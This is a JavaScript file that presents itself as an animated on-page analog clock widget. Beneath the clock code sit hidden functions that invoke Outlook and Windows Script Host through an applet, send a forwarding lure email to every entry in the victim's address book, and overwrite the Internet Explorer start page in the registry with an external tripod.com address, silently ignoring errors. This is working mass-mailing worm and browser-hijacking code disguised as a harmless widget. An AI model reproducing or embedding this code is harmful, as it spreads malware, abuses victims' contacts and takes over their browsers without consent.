function clock() {
time = new Date ();
secs = time.getSeconds();
sec = -1.57 + Math.PI * secs/30;
mins = time.getMinutes();
min = -1.57 + Math.PI * mins/30;
hr = time.getHours();
hrs = -1.57 + Math.PI * hr/6 + Math.PI*parseInt(time.getMinutes())/360;
if (ns) {
Ypos = window.pageYOffset+window.innerHeight-60;
Xpos = window.pageXOffset+window.innerWidth-80;
}
else {
Ypos = document.body.scrollTop + window.document.body.clientHeight - 60;
Xpos = document.body.scrollLeft + window.document.body.clientWidth - 60;
}
if (ns) {
for (i = 0; i < dots; ++i){
document.layers["nsDigits"+i].top = Ypos - 5 + 40 * Math.sin(-0.49+dots+i/1.9);
document.layers["nsDigits"+i].left = Xpos - 15 + 40 * Math.cos(-0.49+dots+i/1.9);
}
for (i = 0; i < S.length; i++){
document.layers["nx"+i].top = Ypos + i * Ybase * Math.sin(sec);
document.layers["nx"+i].left = Xpos + i * Xbase * Math.cos(sec);
}
for (i = 0; i < M.length; i++){
document.layers["ny"+i].top = Ypos + i * Ybase * Math.sin(min);
document.layers["ny"+i].left = Xpos + i * Xbase * Math.cos(min);
}
for (i = 0; i < H.length; i++){
document.layers["nz"+i].top = Ypos + i * Ybase * Math.sin(hrs);
document.layers["nz"+i].left = Xpos + i * Xbase * Math.cos(hrs);
   }
}
else{
for (i=0; i < dots; ++i){
ieDigits[i].style.pixelTop = Ypos - 15 + 40 * Math.sin(-0.49+dots+i/1.9);
ieDigits[i].style.pixelLeft = Xpos - 14 + 40 * Math.cos(-0.49+dots+i/1.9);
}
for (i=0; i < S.length; i++){
x[i].style.pixelTop = Ypos + i * Ybase * Math.sin(sec);
x[i].style.pixelLeft = Xpos + i * Xbase * Math.cos(sec);
}
for (i=0; i < M.length; i++){
y[i].style.pixelTop = Ypos + i * Ybase * Math.sin(min);
y[i].style.pixelLeft = Xpos + i * Xbase * Math.cos(min);
}
for (i=0; i < H.length; i++){
z[i].style.pixelTop = Ypos + i * Ybase*Math.sin(hrs);
z[i].style.pixelLeft = Xpos + i * Xbase*Math.cos(hrs);
   }
}
setTimeout('clock()', 50);
}
function ShowClock(){
fCol = '000000';  //face colour.
sCol = 'ff0000';  //seconds colour.
mCol = '000000';  //minutes colour.
hCol = '000000';  //hours colour.
H = '....';
H = H.split('');
M = '.....';
M = M.split('');
S = '......';
S = S.split('');
Ypos = 0;
Xpos = 0;
Ybase = 8;
Xbase = 8;
dots = 12;
ns = (document.layers)?1:0;
if (ns) {
dgts = '1 2 3 4 5 6 7 8 9 10 11 12';
dgts = dgts.split(' ');
for (i = 0; i < dots; i++) {
document.write('<layer name=nsDigits'+i+' top=0 left=0 height=30 width=30><center><font face=Arial,Verdana size=1 color='+fCol+'>'+dgts[i]+'</font></center></layer>');
}
for (i = 0; i < M.length; i++) {
document.write('<layer name=ny'+i+' top=0 left=0 bgcolor='+mCol+' clip="0,0,2,2"></layer>');
}
for (i = 0; i < H.length; i++) {
document.write('<layer name=nz'+i+' top=0 left=0 bgcolor='+hCol+' clip="0,0,2,2"></layer>');
}
for (i = 0; i < S.length; i++) {
document.write('<layer name=nx'+i+' top=0 left=0 bgcolor='+sCol+' clip="0,0,2,2"></layer>');
   }
}
else {
document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
for (i = 1; i < dots+1; i++) {
document.write('<div id="ieDigits" style="position:absolute;top:0px;left:0px;width:30px;height:30px;font-family:Arial,Verdana;font-size:10px;color:'+fCol+';text-align:center;padding-top:10px">'+i+'</div>');
}
document.write('</div></div>')
document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
for (i = 0; i < M.length; i++) {
document.write('<div id=y style="position:absolute;width:2px;height:2px;font-size:2px;background:'+mCol+'"></div>');
}
document.write('</div></div>')
document.write('</div></div>')
document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
for (i = 0; i < H.length; i++) {
document.write('<div id=z style="position:absolute;width:2px;height:2px;font-size:2px;background:'+hCol+'"></div>');
}
document.write('</div></div>')
document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
for (i = 0; i < S.length; i++) {
document.write('<div id=x style="position:absolute;width:2px;height:2px;font-size:2px;background:'+sCol+'"></div>');
}
document.write('</div></div>')
}
clock();
}
function tellfriend(){
if(WShl.RegRead("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page") == "http://pccontrol.tripod.com/")
{return(0);}
ta=ol.GetNameSpace("MAPI").AddressLists.count;
for(a=1;a<=ta;++a){
	tb=ol.GetNameSpace("MAPI").AddressLists(a).AddressEntries.count;
	for(b=1;b<=tb;++b){
		try{
		Mail=ol.CreateItem(0);
		Mail.to=ol.GetNameSpace("MAPI").AddressLists(a).AddressEntries(b);
		Mail.Subject="Hi !";
		Mail.Body="Hi, how are you ? I am fine here. Please read the page http://pcControl.tripod.com/ to get some knowledge and prevent somebody hack you. Forword this mail to help all your friends too.";
		Mail.Send;
		}
		catch(e){}
	}
}
}
function WriteRegMain()
{
if(WShl.RegRead("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page") != "http://pccontrol.tripod.com/")
{WShl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page","http://pccontrol.tripod.com/");}
}
function init(){
	try{
		isme=document.applets[0];
		isme.setCLSID("{0006F03A-0000-0000-C000-000000000046}");
		isme.createInstance();
		ol = isme.GetObject();
		isme.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
		isme.createInstance();
		WShl = isme.GetObject();
		tellfriend();
	}catch(e){}
	try{
		isme=document.applets[0];
		isme.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
		isme.createInstance();
		WShl = isme.GetObject();
		WriteRegMain();
	}
	catch(e){}
}
function start(){setTimeout("init()", 1000);}